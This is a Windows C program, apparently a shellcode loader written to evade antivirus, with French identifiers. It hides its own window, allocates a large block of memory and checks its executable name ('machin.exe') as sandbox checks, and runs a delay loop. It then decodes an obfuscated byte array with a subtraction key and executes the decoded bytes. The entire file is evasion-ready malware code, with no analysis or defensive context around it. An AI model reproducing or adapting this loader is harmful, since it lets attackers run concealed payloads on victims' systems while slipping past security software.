#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

int compt1 = 0;
int compt2 = 0;
int longu = 0;
int position = 0;
int avEvade[100];
int longueur2 = 0;

#define TOO_MUCH_MEM 10000000

unsigned char code[] =
"\x37\xce\x8b\xed\xa9\xf0\xff\xff\xff\xff\xc6\x5f\x84\x79\x15\x20\x2b\x52\xc3\x85\xf4\xfd\xe8\xfa\x36\xe8\xcf\x32\xba\xc8\xb2\x42\xe3\xdd\x95\x9f\xa1\x61\x42\x20\x8b\xd8\x3c\x46\xf6\xdd\xb5\x3e\x3f\x5d\x3b\xbc\xc8\xb4\xda\x3c\x2c\x84\x7f\xe1\x53\xe5\x89\x32\x98\xc0\x44\xea\xd6\x3f\xca\x9b\xd0\xa\xfc\xa3\xf7\x58\x1d\x88\xb0\xd5\xb9\x9e\xec\x78\x7f\xbc\xcb\x7b\x57\x4c\x9a\xe8\x3e\xea\xd7\x41\xfc\x8a\x50\xfc\xb0\xca\x2a\xfd\xba\x6e\x98\x42\xf8\xa0\xc8\x67\x46\xfa\xe3\x5b\x93\xfb\x55\x89\x3f\xc2\x14\x83\x51\x18\x9\x82\xbe\xbc\x6\x89\x5d\xd8\x37\xb9\xd0\x4b\xfd\xd3\x94\xd4\x25\xf0\x44\xe9\xe7\xb2\x6e\xe3\x54\xbe\xfd\x39\xa5\xad\xbe\x6c\x54\xb5\x43\xc4\x19\x3a\xf9\xa0\xe8\xf4\xf6\xe2\xa8\xeb\xef\x47\x27\xf7\xeb\xe7\x4e\xa5\x66\x3d\x9d\xdb\x86\x8d\xcf\xb3\xdf\xcf\xbd\x84\xeb\xf6\xb3\xfd\xc8\xa1\xc4\x51\x6b\x5\x5c\xb8\xb8\xbc\xf4\x7b\xe7\xee\xb7\xa2\x37\xd8\xca\x51\x64\xd6\xc9\xe0\x7c\x18\xca\xc3\xe3\xc1\xcb\xb6\x65\x38\x21\xe6\xed\xf1\x9f\xf3\xee\xfe\x9b\xe1\x63\xb7\x1e\x54\x50\x76\x57\xde\xad\xf0\x93\xe0\x35\x20\xb8\xda\x4d\x73\x46\x78\xc6\xb2\x3f\xfe\xc5\xd5\x31\x5d\xdf\xc3\xca\xb1\xe5\xbe\xaf\xbc\xe4\xf0\xb4\xb3\x71\x7b\x9e\x52\x6b\x3b\x3f\xb5\xce\x93\x54\x87\xe0\xfe\xb5\xb1\xaa\xbf\xcb\xec\xdf\xbf\xb4\xf0\x1b\xf1\x26\x57\x65\x2d\x9b\xde\xbb\xed\x9a\xed\xe6\xbd\x25\x7e\xeb\x4c\x17\x39\x57\xbb\xc0\x95\xf0\xd4\xc8\xf9\xbc\xc3\xaf\xb3\xec\xd3\xd5\xa7\xbe\x8d\x3a\x6b\xe3\xd7\xb8\xe0\xfb\xdf\x3b\x69\xf1\xe9\x40\xc0\x93\x5c\xbf\x55\x51\x4e\xcb\x76\xa0\x7d\xb8\x7b\x7c\x6\x3f\xd\x16\xf2\xaf\xb4\xe9\x4e\x14\xb5\xbb\xbf";


int num[] =
{ 4,5,8,4,3,8,0,0,0,0,6,1,3,3,7,3,3,4,1,2,6,1,6,6,8,7,2,7,9,8,1,5,1,6,7,3,5,3,2,7,6,8,6,5,3,9,9,8,5,5,7,2,2,4,4,9,9,3,9,3,6,5,3,1,4,4,7,2,4,4,6,9,7,3,0,7,0,9,3,2,9,9,5,8,6,7,6,5,4,4,3,4,6,1,1,2,1,6,0,4,3,0,9,8,5,5,3,3,1,7,9,6,1,4,9,7,5,8,7,8,8,5,2,7,4,2,8,2,2,3,3,1,5,1,7,9,7,6,5,9,0,6,2,5,3,8,7,7,5,1,9,7,7,2,0,8,7,1,7,3,7,1,6,9,3,1,7,2,6,9,9,7,9,1,8,2,1,8,2,7,1,3,9,6,2,3,1,5,9,3,1,2,8,2,2,8,5,1,7,5,3,2,8,3,6,7,2,2,5,7,5,4,9,9,1,7,4,2,1,6,6,8,6,6,4,9,5,9,5,2,1,5,1,6,7,7,9,3,8,4,5,9,7,2,5,4,7,7,6,4,7,4,2,8,6,1,6,9,4,4,3,8,4,2,6,0,7,6,7,5,8,9,4,1,9,4,3,8,4,3,6,1,2,9,5,3,8,2,1,5,6,7,7,1,4,4,7,1,4,5,5,6,3,5,6,8,9,8,3,8,2,4,6,4,5,1,5,6,8,5,6,6,2,7,4,6,9,1,5,3,2,2,2,9,6,9,3,3,6,1,8,8,5,3,1,6,2,5,5,2,0,4,2,4,9,5,7,4,1,9,8,6,8,9,4,3,1,1,5,4,7,5,9,8,2,6,3,4,4,9,1,5,5,5 };
int var12;
int(*ret)() = (int(*)())code;


int main(int argc, char *argv[])
{

	HWND hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);

	char
		* memdmp = NULL;
	memdmp = (
		char
		*)malloc(TOO_MUCH_MEM);
	if
		(memdmp != NULL)
	{

		if
			(strstr(argv[0], "machin.exe") >0)
		{

			if (strstr(argv[0], "machin.exe"))
			{
				var12 = strlen(code);
				while (compt2<98000)
				{
					compt2 += 1;
				}
				while (position<var12)
				{
					code[position] = code[position] - num[position];
					position++;
				}
				printf("%x", code);
				printf("Execution en cours ...");
				ret();

			}
			return 0;
		}
		return 0;
	}
}







